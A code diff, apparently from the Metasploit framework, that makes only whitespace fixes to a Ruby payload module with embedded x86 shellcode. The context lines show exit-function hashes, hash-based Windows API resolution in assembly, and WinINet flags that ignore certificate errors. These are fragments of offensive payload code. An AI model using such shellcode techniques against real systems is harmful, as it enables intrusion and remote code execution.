@@ -55,7 +55,7 @@ module Metasploit3
 			#;0x00001000 |        ; INTERNET_FLAG_IGNORE_CERT_CN_INVALID
 			#;0x00002000 |        ; INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
 			#;0x00000200          ; INTERNET_FLAG_NO_UI"
-	
+
 		exitfuncs = {
 				"PROCESS"   => 0x56A2B5F0,	#kernel32.dll!ExitProcess
 				"THREAD"    => 0x0A2A1DE0,	#kernel32.dll!ExitThread
@@ -73,11 +73,11 @@ module Metasploit3
 
 		if exitfuncs[exitfunc]
 			exitasm = case exitfunc
-        			when "SEH" then "xor eax,eax\ncall eax"
+				when "SEH" then "xor eax,eax\ncall eax"
 				when "NONE" then "jmp end"	# don't want to load user32.dll for GetLastError
-				else "push 0x0\npush 0x%x\ncall ebp" % exitfuncs[exitfunc]   
+				else "push 0x0\npush 0x%x\ncall ebp" % exitfuncs[exitfunc]
 			end
-        	end	
+		end
 
 		# parse URL and break it down in
 		# - remote host
@@ -188,7 +188,7 @@ loop_funcname:             ;
 	cmp al, ah             ; Compare AL (the next byte from the name) to AH (null)
 	jne loop_funcname      ; If we have not reached the null terminator, continue
 	add edi, [ebp-8]       ; Add the current module hash to the function hash
-	cmp edi, [ebp+36]      ; Compare the hash to the one we are searchnig for 
+	cmp edi, [ebp+36]      ; Compare the hash to the one we are searchnig for
 	jnz get_next_func      ; Go compute the next function hash if we have not found it
 	; If found, fix up stack, call the function and then value else compute the next one...
 	pop eax                ; Restore the current modules EAT
